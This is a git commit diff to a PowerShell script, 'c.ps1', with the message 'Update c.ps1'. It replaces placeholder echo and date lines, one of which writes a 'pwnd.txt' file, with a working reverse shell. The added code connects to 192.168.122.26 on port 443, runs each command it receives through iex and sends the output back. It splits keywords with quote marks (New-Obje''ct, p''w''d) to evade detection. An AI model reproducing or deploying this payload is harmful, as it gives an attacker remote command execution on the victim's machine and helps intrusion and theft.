8a6961239af92be760be504acd278981d3626717
4ndrz3j <70114673+4ndrz3j@users.noreply.github.com>
2023-12-05 20:51:25 +0000

    Update c.ps1

--- c.ps1
+++ c.ps1
@@ -1,6 +1,4 @@
-date > $home/pwnd.txt
-echo "Hello World!"
-echo "Hello second time!"
-sleep 10
-# comment
-# Second comment
+$ip = "192.168.122.26"
+$port = "443"
+ 
+$c= New-Obje''ct System.Net.Sockets.TCPClient($ip,$port);$s= $c.GetStream();[byte[]]$b= 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d= (N''e''w-O''b''j''e''c''t -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex ". { $d} 2>&1" | Out-String );$sendback2 = $sendback + 'P'+'S ' + (p''w''d).Path + '->';$sb= ([text.encoding]::ASCII).GetBytes($sendback2);$s.Write($sb,0,$sb.Length);$stream.Flush()};$client.Close()
